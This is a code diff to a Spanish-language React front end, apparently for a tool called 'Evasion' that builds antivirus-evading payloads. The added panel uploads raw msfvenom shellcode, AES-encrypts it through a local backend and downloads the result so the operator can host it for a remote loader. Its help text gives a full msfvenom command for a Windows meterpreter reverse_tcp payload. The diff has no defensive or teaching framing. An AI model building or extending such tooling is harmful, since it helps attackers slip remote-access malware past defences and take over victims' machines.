@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import {
   Shield,
   Download,
@@ -15,6 +15,8 @@ import {
   Terminal,
   Eye,
   EyeOff,
+  Upload,
+  FileCode,
 } from "lucide-react";
 
 // ─── Paleta ───────────────────────────────────────────────────────────────────
@@ -133,6 +135,11 @@ export default function Evasion() {
   const [success, setSuccess] = useState(false);
   const [error, setError] = useState(null);
   const [showPreview, setShowPreview] = useState(false);
+  const [shellcodeFile, setShellcodeFile] = useState(null);
+  const [encrypting, setEncrypting] = useState(false);
+  const [encryptSuccess, setEncryptSuccess] = useState(false);
+  const [encryptError, setEncryptError] = useState(null);
+  const fileInputRef = useRef(null);
 
   const set = (field, value) => {
     setConfig((prev) => ({ ...prev, [field]: value }));
@@ -184,6 +191,44 @@ export default function Evasion() {
     }
   };
 
+  const handleEncryptShellcode = async () => {
+    if (!shellcodeFile) return;
+    if (!config.encryption_key.trim()) {
+      setEncryptError("Configurá primero la clave AES abajo");
+      return;
+    }
+    setEncrypting(true);
+    setEncryptSuccess(false);
+    setEncryptError(null);
+    try {
+      const formData = new FormData();
+      formData.append("shellcode", shellcodeFile);
+      formData.append("encryption_key", config.encryption_key);
+      const res = await fetch("http://localhost:5000/cifrar-shellcode", {
+        method: "POST",
+        body: formData,
+      });
+      if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        throw new Error(data.error || `Error ${res.status}`);
+      }
+      const blob = await res.blob();
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "shell_encrypted.bin";
+      document.body.appendChild(a);
+      a.click();
+      window.URL.revokeObjectURL(url);
+      document.body.removeChild(a);
+      setEncryptSuccess(true);
+    } catch (err) {
+      setEncryptError(err.message);
+    } finally {
+      setEncrypting(false);
+    }
+  };
+
   const previewJson = JSON.stringify(config, null, 2);
 
   return (
@@ -223,29 +268,97 @@ export default function Evasion() {
           {/* ── Panel izquierdo: configuración ── */}
           <div className="lg:col-span-2 space-y-5">
 
-            {/* Shellcode URL */}
+            {/* Cifrar Shellcode */}
             <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
-              <SectionTitle icon={Link} label="Shellcode Remoto" color="#58a6ff" />
+              <SectionTitle icon={Upload} label="Cifrar Shellcode" color="#bc8cff" />
               <div className="space-y-4">
-                <InputField
-                  label="URL del shellcode cifrado"
-                  value={config.server_url}
-                  onChange={(v) => set("server_url", v)}
-                  placeholder="https://cdn.ejemplo.com/payload.bin"
-                />
                 <div
                   className="flex items-start gap-2 text-xs px-3 py-2 rounded-lg"
                   style={{ background: "rgba(88,166,255,0.08)", border: "1px solid rgba(88,166,255,0.2)", color: "#8b949e" }}
                 >
                   <Terminal size={12} className="mt-0.5 shrink-0" style={{ color: "#58a6ff" }} />
                   <span>
-                    Generá el shellcode con msfvenom y cifralo con la clave AES configurada abajo.
+                    Generá el shellcode raw con msfvenom, cifralo acá con la clave AES, y hosteá el <span className="font-mono" style={{ color: "#79c0ff" }}>shell_encrypted.bin</span> resultante.
                     Ejemplo: <span className="font-mono" style={{ color: "#79c0ff" }}>
                       msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f raw -o shell.bin
                     </span>
                   </span>
                 </div>
+
+                <div>
+                  <label className="block text-xs font-medium mb-1.5" style={{ color: "#8b949e" }}>
+                    Archivo shellcode (.bin raw de msfvenom)
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      ref={fileInputRef}
+                      type="file"
+                      accept=".bin,.raw"
+                      className="hidden"
+                      onChange={(e) => {
+                        setShellcodeFile(e.target.files[0] || null);
+                        setEncryptSuccess(false);
+                        setEncryptError(null);
+                      }}
+                    />
+                    <button
+                      onClick={() => fileInputRef.current?.click()}
+                      className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-mono transition-all"
+                      style={{
+                        background: "#0d1117",
+                        border: `1px solid ${shellcodeFile ? ACTIVE : BORDER}`,
+                        color: shellcodeFile ? "#79c0ff" : "#6e7681",
+                        flex: 1,
+                        textAlign: "left",
+                        minWidth: 0,
+                      }}
+                    >
+                      <FileCode size={12} style={{ color: shellcodeFile ? "#58a6ff" : "#484f58", flexShrink: 0 }} />
+                      <span className="truncate">
+                        {shellcodeFile ? shellcodeFile.name : "Seleccionar archivo..."}
+                      </span>
+                    </button>
+                    <button
+                      onClick={handleEncryptShellcode}
+                      disabled={!shellcodeFile || encrypting}
+                      className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all disabled:opacity-40 disabled:cursor-not-allowed whitespace-nowrap"
+                      style={{
+                        background: encryptSuccess ? "rgba(63,185,80,0.15)" : "rgba(188,140,255,0.15)",
+                        border: `1px solid ${encryptSuccess ? "rgba(63,185,80,0.4)" : "rgba(188,140,255,0.4)"}`,
+                        color: encryptSuccess ? "#3fb950" : "#bc8cff",
+                      }}
+                    >
+                      {encrypting ? (
+                        <Loader2 size={12} className="animate-spin" />
+                      ) : encryptSuccess ? (
+                        <CheckCircle size={12} />
+                      ) : (
+                        <Download size={12} />
+                      )}
+                      {encrypting ? "Cifrando..." : encryptSuccess ? "Descargado" : "Cifrar y Descargar"}
+                    </button>
+                  </div>
+                  {encryptError && (
+                    <p className="text-xs mt-1.5 font-mono" style={{ color: "#f85149" }}>{encryptError}</p>
+                  )}
+                  {encryptSuccess && (
+                    <p className="text-xs mt-1.5 font-mono" style={{ color: "#3fb950" }}>
+                      shell_encrypted.bin descargado — hostealo y copiá la URL abajo
+                    </p>
+                  )}
+                </div>
               </div>
+            </div>
+
+            {/* Shellcode URL */}
+            <div className="rounded-xl border p-5" style={{ background: CARD, borderColor: BORDER }}>
+              <SectionTitle icon={Link} label="URL del Shellcode Cifrado" color="#58a6ff" />
+              <InputField
+                label="URL donde hosteaste el shell_encrypted.bin"
+                value={config.server_url}
+                onChange={(v) => set("server_url", v)}
+                placeholder="https://cdn.ejemplo.com/shell_encrypted.bin"
+              />
             </div>
 
             {/* Cifrado */}
